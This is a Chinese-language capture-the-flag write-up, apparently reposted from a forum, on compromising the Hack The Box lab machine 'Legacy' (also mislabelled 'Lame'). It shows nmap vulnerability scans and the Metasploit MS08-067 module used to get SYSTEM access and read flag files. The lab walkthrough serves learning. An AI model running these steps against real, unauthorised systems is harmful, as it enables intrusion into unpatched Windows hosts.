
# [CTF] Hack The Box-----------Legacy

- 原帖: https://www.52pojie.cn/forum.php?mod=viewthread&tid=1573629
- 抓取时间: 2026-11-01T23:42:41

在家准备考研，更新慢~~~

作者：0x3ml

个人博客: https://ctf101.gitee.io/

人生格言:不管你有多菜，心中也一定要自信，别自负哦！

## 靶机介绍

名称: Lame

目标：寻找`root.txt`和`user.txt`

难度：容易

![](https://gitee.com/ctf101/mycdn/raw/master/img/image-20220109175219459.png)

## 打靶过程

连接`hack the box`的`vpn`

```bash
openvpn xxxx.ovpn
```
![](https://gitee.com/ctf101/mycdn/raw/master/img/image-20220108195616021.png)

使用`zenmap`进行扫描，以发现更多有用信息

```bash
nmap -sV -O -F 10.10.10.4
```
注：
`-sV`：表示探测开放的端口
`-O`：表示使用的操作系统
`-F`：表示快速扫描模式

![](https://gitee.com/ctf101/mycdn/raw/master/img/image-20220109182602400.png)

发现操作系统为`Windows XP`，又开放`445`端口，想到永恒之蓝漏洞，使用`nmap`的命令去查询`445`端口的已知漏洞，发现`ms08-067`。

```bash
nmap -p 445 --script vuln 10.10.10.4
```
![](https://gitee.com/ctf101/mycdn/raw/master/img/image-20220109183113764.png)

使用`searchsploit`命令查询`ms08-067`

```bash
searchsploit ms08-067
```
![](https://gitee.com/ctf101/mycdn/raw/master/img/image-20220109183428292.png)

启动`msf`框架进行利用漏洞，使用命令`search ms08-067`

![](https://gitee.com/ctf101/mycdn/raw/master/img/image-20220109183642506.png)

使用模块，进行漏洞利用

```bash
use exploit/windows/smb/ms08_067_netapi
```
![](https://gitee.com/ctf101/mycdn/raw/master/img/image-20220109183924470.png)

`show options`进行配置

```bash
set rhosts 10.10.10.4
set lhost 10.10.17.237
```
![](https://gitee.com/ctf101/mycdn/raw/master/img/image-20220109184117322.png)

`run`命令进行启动

![](https://gitee.com/ctf101/mycdn/raw/master/img/image-20220109185102418.png)

`getuid`查看用户为`NT AUTHORITY\SYSTEM`

注：
`NT AUTHORITY\SYSTEM`是不需要密码的管理员用户，普通管理员用户是需要密码。

使用命令`search -f user.txt`和`search -f roor.txt`查询这两个文件的位置。

![](https://gitee.com/ctf101/mycdn/raw/master/img/image-20220109185939935.png)

使用`Windows`的`dos`命令，进入`c:\Documents and Settings\john\Desktop\user.txt`查看`user.txt`文件，获取到第一个`flag`。

```bash
pwd     //获取当前的路径
cd ..   //返回上一级目录
cd ..   //返回上一级目录
cd Documents\ and\ Settings  //进入Documents and Settings文件夹下
cd john        //进入john文件夹
cd Desktop     //进入Desktop文件夹
ls             //查看文件列表
cat user.txt   //查看user.txt文件内容
```
![](https://gitee.com/ctf101/mycdn/raw/master/img/image-20220109190649526.png)

同理，进入路径`c:\Documents and Settings\Administrator\Desktop\root.txt`查看`root.txt`，获取到第二个`flag`。

![](https://gitee.com/ctf101/mycdn/raw/master/img/image-20220109190916991.png)

## 打靶收获

- `Windows`下的`dos`命令
- `NT AUTHORITY\SYSTEM`用户
- `ms08-067`漏洞
- `nmap`的一些使用技巧
- 扫描网络：`nmap -sV -O -F 10.10.10.4`
- 扫描端口已知的漏洞：`nmap -p 445 --script vuln 10.10.10.4`
